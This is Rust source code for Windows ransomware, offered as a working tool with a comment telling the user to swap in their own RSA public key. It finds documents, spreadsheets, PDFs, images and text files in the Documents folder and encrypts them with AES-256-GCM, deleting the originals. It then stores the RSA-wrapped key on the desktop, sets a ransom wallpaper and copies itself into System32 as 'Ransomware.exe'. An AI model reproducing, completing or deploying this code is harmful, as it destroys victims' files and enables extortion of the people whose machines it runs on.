use std::ffi::{OsStr, OsString};
use std::fs::{self, remove_file, File, OpenOptions};
use std::io::{BufWriter, Read, Write};
use std::os::windows::ffi::{OsStrExt, OsStringExt};

extern crate winapi;
use ring::aead::{Aad, BoundKey, Nonce, NonceSequence, SealingKey, UnboundKey, AES_256_GCM};
use ring::error::Unspecified;
use ring::rand::{SecureRandom, SystemRandom};
use ring::aead::NONCE_LEN;
use winapi::um::sysinfoapi::GetSystemDirectoryW;
use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};


use rsa::pkcs8::DecodePublicKey;
use rsa::Pkcs1v15Encrypt;
use rsa::RsaPublicKey;

use walkdir::WalkDir;

const IMAGE_DATA: &[u8] = include_bytes!(r"resources\backgroound.png");


struct CounterNonceSequence(u32);

impl NonceSequence for CounterNonceSequence {
    // called once for each seal operation
    fn advance(&mut self) -> Result<Nonce, Unspecified> {
        let mut nonce_bytes = vec![0; NONCE_LEN];

        let bytes = self.0.to_be_bytes();
        nonce_bytes[8..].copy_from_slice(&bytes);
        println!("nonce_bytes = {}", hex::encode(&nonce_bytes));

        self.0 += 1; // advance the counter
        Nonce::try_assume_unique_for_key(&nonce_bytes)
    }
}


fn encrypt_file(
    input_file_path: &str,
    output_file_path: &str,
    key_bytes: Vec<u8>,
) -> Result<(), Box<dyn std::error::Error>> {

    let nonce_sequence = CounterNonceSequence(1);
    let key = UnboundKey::new(&AES_256_GCM, &key_bytes).unwrap();

    let mut sealing_key = SealingKey::new(key, nonce_sequence);


    let mut input_file = File::open(input_file_path)?;
    let mut input_data = Vec::new();
    input_file.read_to_end(&mut input_data)?;

    let mut in_out = input_data.clone();

    let associated_data = Aad::from(b"Ransom");

    let tag = sealing_key.seal_in_place_separate_tag(associated_data, &mut in_out).unwrap();

    let mut output_file = OpenOptions::new()
        .write(true)
        .create(true)
        .open(output_file_path)?;
    output_file.write_all(&in_out)?;

    Ok(())
}

fn main() {
    let extensions = ["docx", "xlsx", "pdf", "jpeg", "jpg", "txt"];

    let rand = SystemRandom::new();

    // Generate a new symmetric encryption key
    let mut key_bytes = vec![0; AES_256_GCM.key_len()];
    let _ = rand.fill(&mut key_bytes);

    let documents_dir = match dirs::document_dir() {
        Some(path) => path,
        None => {
            eprintln!("Could not find the Documents folder.");
            return;
        }
    };

    // Change this for your public RSA key
    let pem = "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlpnmNvyemuON6QMsVZZX
29vXAc0rapY0XBqN1qdzf/UoeBDV5VYMh+E4aq0XhDDHEQCLkHmoLgpuP2mVnX3O
P/qNDOuNF2yIMQqRThQ3bTjAQa5MurgWBfZOU8up+RYAD82Lc50amIIYGw368Wep
DN0oPWCRjWF+9AXlfkBcN3PMLYH0uWsBoT6l6ajb5HO1HUX+hxXm3UCxRFr3YTeL
CsVPf8KPVZz+xHJ4C7qLsitsVyHsvHokOyrJ1ZY0W7GIXT8+fwlrzuzWCTvOMs7n
wLG0EUDUsMEbuepjv0ZBtZy+MWdkti9Rfu0Gih247HHDfX6LKwgDJAR7po1wVE9B
SwIDAQAB
-----END PUBLIC KEY-----";

    let public_key = RsaPublicKey::from_public_key_pem(pem).unwrap();
    let mut rng = rand::thread_rng();

    let passenc = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, &key_bytes).unwrap();
    let _ = save_key_to_file(&passenc, "password_encrypted_DONT_DELETE.");

    for entry in WalkDir::new(documents_dir)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| {
            e.file_type().is_file() &&
            e.path().extension()
                .and_then(|ext| ext.to_str())
                .map(|ext| extensions.contains(&ext))
                .unwrap_or(false)
        }) {
        let _encrypted_filee = encrypt_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), key_bytes.clone());
        let _ = remove_file(entry.path());
    }

    let temp_image_path = "C:\\temp_image.jpg";

    match save_image_to_temp_file(temp_image_path, IMAGE_DATA) {
        Ok(_) => {},
        Err(e) => {
            eprintln!("Failed to save image to temporary file: {}", e);
            return;
        }
    };

    if let Err(e) = set_desktop_background(temp_image_path) {
        eprintln!("Failed to set desktop background: {}", e);
    }

    let mut dest_dir = get_system32_path();
    dest_dir.push(r"\Ransomware.exe");


    let current_exe_path = match std::env::current_exe() {
        Ok(path) => path,
        Err(e) => {
            eprintln!("Error getting current executable path: {}", e);
            return;
        }
    };

    if let Err(e) = fs::copy(&current_exe_path, &dest_dir) {
        eprintln!("Error copying file: {}", e);
        return;
    }

}

fn save_key_to_file(key: &[u8], file_name: &str) -> std::io::Result<()> {
    let desktop_dir = match dirs::desktop_dir() {
        Some(path) => path,
        None => return Err(std::io::Error::new(std::io::ErrorKind::NotFound, "Desktop directory not found")),
    };
    let key_file_path = desktop_dir.join(file_name);
    let mut key_file = BufWriter::new(File::create(&key_file_path)?);
    key_file.write_all(key)?;
    Ok(())
}

fn save_image_to_temp_file(path: &str, data: &[u8]) -> std::io::Result<()> {
    let mut file = File::create(path)?;
    file.write_all(data)?;
    file.sync_all()?;
    Ok(())
}

fn set_desktop_background(path: &str) -> Result<(), String> {
    let wide_path: Vec<u16> = OsStr::new(path).encode_wide().chain(std::iter::once(0)).collect();

    unsafe {
        let _result = SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            wide_path.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE | SPIF_SENDCHANGE,
        );
    }

    Ok(())
}

fn get_system32_path() -> OsString {
    let mut buffer: [u16; winapi::shared::minwindef::MAX_PATH] = [0; winapi::shared::minwindef::MAX_PATH];
    unsafe {
        let len = GetSystemDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32) as usize;
        OsString::from_wide(&buffer[..len])
    }
}